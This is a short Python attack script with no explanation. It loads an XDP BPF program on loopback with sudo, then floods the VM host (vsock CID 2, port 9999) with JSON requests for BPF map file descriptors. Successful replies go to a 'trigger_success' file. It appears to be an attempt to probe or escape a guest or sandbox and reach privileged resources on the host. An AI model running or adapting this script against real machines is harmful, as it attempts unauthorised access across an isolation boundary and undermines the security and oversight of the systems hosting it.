import socket
import json
import time
import subprocess
import threading

# Load the BPF object first
subprocess.run(['sudo', 'ip', 'link', 'set', 'dev', 'lo', 'xdp', 'off'])
subprocess.run(['sudo', 'ip', 'link', 'set', 'dev', 'lo', 'xdp', 'obj', 'diag.o', 'sec', 'prog'])

payloads = [
    {"action": "bpf_send_map_fds", "map_id": 1},
    {"action": "bpf_send_map_fds", "map_id": 2},
    {"action": "bpf_send_map_fds", "map_id": 3},
    {"action": "bpf_send_map_fds", "map_id": 4},
    {"action": "bpf_send_map_fds", "map_id": 5}
]

def send_payload(payload):
    for _ in range(50):
        try:
            s = socket.socket(socket.AF_VSOCK, socket.SOCK_STREAM)
            s.settimeout(0.5)
            s.connect((2, 9999))
            s.sendall(json.dumps(payload).encode() + b"\n")
            data = s.recv(1024)
            if data:
                with open("/tmp/trigger_success.txt", "a") as f:
                    f.write(f"Payload {payload} -> {data}\n")
            s.close()
            time.sleep(0.1)
        except Exception as e:
            time.sleep(0.1)

for p in payloads:
    threading.Thread(target=send_payload, args=(p,), daemon=True).start()

while True:
    time.sleep(1)
